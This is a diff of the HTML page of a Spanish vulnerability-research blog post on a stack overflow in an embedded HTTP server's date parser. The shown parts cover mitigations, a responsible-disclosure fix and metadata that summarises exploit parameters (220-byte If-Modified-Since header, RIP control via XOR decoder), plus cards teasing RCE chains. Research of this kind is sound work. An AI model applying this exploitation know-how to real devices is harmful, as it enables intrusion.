-                    <tr><td class="mono">ASLR</td><td>El layout in-stack es determinista (dirección fija), elude ASLR del heap/libs</td></tr>
-                </tbody>
-            </table>
-        </div>
-        <div class="callout-danger">
-            <div class="callout-title mono">Divulgación responsable</div>
-            <p>El fix en el mantenedor es copiar con un bound basado en el destino (<span class="mono">strncpy(buf, date, sizeof(buf)-1)</span> y terminar), o validar la longitud de la cabecera antes del parseo. Publicado con fines de hardening y comunicado al mantenedor como parte del proceso responsable.</p>
-        </div>
-
-        <h2 class="section-title mono" id="l06"><span style="color: var(--text-muted);">06.</span> 0x05 — Referencias</h2>
-        <div class="table-wrapper">
-            <table>
-                <thead><tr><th>Referencia</th><th>Descripción</th></tr></thead>
-                <tbody>
-                    <tr><td class="mono">file.c:136</td><td>Sink el conversor de fecha a timestamp: strncpy sin bound de destino</td></tr>
-                    <tr><td class="mono">If-Modified-Since</td><td>Cabecera HTTP fuente del desbordamiento</td></tr>
-                    <tr><td class="mono">CWE-121</td><td>Stack-based Buffer Overflow</td></tr>
-                    <tr><td class="mono">LECCION E2E</td><td>Disparidad de stack nativo vs gdb (+0xC0) — requiere run real</td></tr>
-                </tbody>
-            </table>
-        </div>
-
-        <p style="margin-top:2rem;">
-            <a href="caza-autonoma-e2e-serie.html" class="mono" style="font-size:0.85rem; color:var(--accent-blue);">← Volver al índice de la serie</a>
-        </p>
-    </article>
-
-    <footer class="footer">
-        <div class="footer-content">
-            <div class="social-links mono">
-                <a href="https://github.com/tty503" target="_blank" rel="noopener noreferrer">github/tty503</a>
-                <a href="https://linkedin.com/in/tty503" target="_blank" rel="noopener noreferrer">linkedin/tty503</a>
-                <a href="https://x.com/tty_503" target="_blank" rel="noopener noreferrer">x/tty_503</a>
-                <a href="https://tty503.com">tty503.com</a>
-            </div>
-            <p class="copyright">© <span id="current-year"></span> Christian Márquez. Vulnerability Research — el servidor HTTP embebido el conversor de fecha a timestamp stack overflow.</p>
-        </div>
-    </footer>
-
-    <script>
-        document.getElementById('current-year').textContent = new Date().getFullYear();
-        const navbar = document.querySelector('.navbar');
-        window.addEventListener('scroll', () => {
-            if (window.scrollY > 50) { navbar.style.background = 'rgba(3, 3, 3, 0.9)'; }
-            else { navbar.style.background = 'rgba(3, 3, 3, 0.75)'; }
-        });
-    </script>
-
-    <script type="application/ld+json">
+<h2 id="l05"><span class="idx">06.</span> 0x04 — Limitaciones de toolchain y mitigación</h2>
+<div class="tbl-wrap">
+  <table>
+    <thead><tr><th>Mitigación</th><th>Impacto en el PoC</th></tr></thead>
+    <tbody>
+      <tr><td>Canario (-fstack-protector)</td><td>Aborta antes del ret si está activo; no lo estaba en la toolchain de referencia</td></tr>
+      <tr><td>NX stack</td><td>Necesita el decoder+RIP ejecutable; en MCU embebido típicamente NX desactivado</td></tr>
+      <tr><td>ASLR</td><td>El layout in-stack es determinista (dirección fija), elude ASLR del heap/libs</td></tr>
+    </tbody>
+  </table>
+</div>
+<div class="callout callout-warn"><span class="ico">⚠</span><div>
+  <div class="h">Divulgación responsable</div>
+  <p>El fix en el mantenedor es copiar con un bound basado en el destino (<code>strncpy(buf, date, sizeof(buf)-1)</code> y terminar), o validar la longitud de la cabecera antes del parseo. Comunicado al mantenedor como parte del proceso responsable.</p>
+</div></div>
+</article>
+<section class="related"><h2>Sigue leyendo</h2><div class="grid grid-2"><a class="card" href="cadena-portal-cautivo-rce.html"><span class="arrow">→</span><div class="meta"><span>2026-09-02</span><span>18 min</span></div><div class="t">el daemon de portal cautivo RCE pre-auth: EAP-Identity → conup (CWE-78)</div><div class="d">Payload en EAP-Response/Identity pre-auth viaja sin saneado por la cadena EAP→RADIUS→env→script y termina en un eval. RC</div><span class="badge badge-rce">Vulnerability Research</span></a><a class="card" href="fw-host-header-rce.html"><span class="arrow">→</span><div class="meta"><span>2026-09-02</span><span>17 min</span></div><div class="t">el daemon de autenticacion y redireccion RCE root: cabecera Host → iptables (CWE-78)</div><div class="d">Request HTTP pre-auth con cabecera Host maliciosa termina en execvp(/bin/sh, -c) que construye iptables. Reverse shell r</div><span class="badge badge-rce">Vulnerability Research</span></a><a class="card" href="autopsia-streaming-http-minimo.html"><span class="arrow">→</span><div class="meta"><span>2026-09-02</span><span>12 min</span></div><div class="t">la biblioteca cliente del protocolo de streaming AMF3 + el servidor HTTP minimo el gestor de credenciales: primitivas reales sin cadena a RCE</div><div class="d">OOB read en el decoder AMF3 de la biblioteca cliente del protocolo de streaming y command injection en el gestor de credenciales de el servidor HTTP minimo. Cuándo una primitiva real no llega</div><span class="badge badge-infra">Vulnerability Research</span></a></div></section>
+</main>
+<footer class="site-footer"><div class="footer-inner">
+<div class="social"><a href="https://github.com/tty503" target="_blank" rel="noopener noreferrer">GitHub</a><a href="https://linkedin.com/in/tty503" target="_blank" rel="noopener noreferrer">LinkedIn</a><a href="https://x.com/tty_503" target="_blank" rel="noopener noreferrer">X / Twitter</a><a href="https://tty503.com/sitemap.xml" target="_blank" rel="noopener noreferrer">RSS</a></div>
+<p class="footer-note">© <span data-year></span> Christian Márquez · Threat Intelligence · Ingeniería Inversa · Exploit Development · Seguridad OT. Venezuela.</p>
+</div></footer>
+<button class="to-top" aria-label="Volver arriba">↑</button>
+<script src="assets/js/main.js"></script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@graph": [
     {
-      "@context": "https://schema.org",
       "@type": "Article",
-      "headline": "el servidor HTTP embebido: Stack Overflow en el conversor de fecha a timestamp (CWE-121)",
-      "description": "Un header If-Modified-Since de 220 bytes desborda buf[128] en el conversor de fecha a timestamp y toma control del RIP con un decoder XOR in-stack. Análisis línea a línea, PoC y validación E2E con ASAN+gdb.",
+      "headline": "el servidor HTTP embebido: stack overflow en el conversor de fecha a timestamp (CWE-121)",
+      "description": "Un If-Modified-Since de 220 bytes desborda buf[128] y toma control parcial del RIP con un decoder XOR in-stack. Disparidad nativo/gdb (+0xC0) documentada y PoC reproducible.",
       "author": { "@type": "Person", "name": "Christian Márquez", "url": "https://tty503.com" },
+      "publisher": { "@type": "Organization", "name": "tty503" },
       "datePublished": "2026-09-02",
       "dateModified": "2026-09-02",
       "mainEntityOfPage": "https://tty503.com/http-el conversor de fecha a timestamp-stackoverflow.html",
-      "inLanguage": "es"
+      "inLanguage": "es",
+      "keywords": "CWE-121, Stack Overflow, HTTP, RIP control"
+    },
+    {
+      "@type": "BreadcrumbList",
+      "itemListElement": [{"@type": "ListItem", "position": 1, "item": {"@id": "https://tty503.com/index.html", "name": "tty503"}}, {"@type": "ListItem", "position": 2, "item": {"@id": "https://tty503.com/caza-autonoma-e2e-serie.html", "name": "Serie"}}, {"@type": "ListItem", "position": 3, "item": {"@id": "https://tty503.com/http-el conversor de fecha a timestamp-stackoverflow.html", "name": "el servidor HTTP embebido: stack overflow en el conversor de fecha a timestamp (CWE-121)"}}]
     }
-    </script>
+  ]
+}
+</script>
 </body>
 </html>
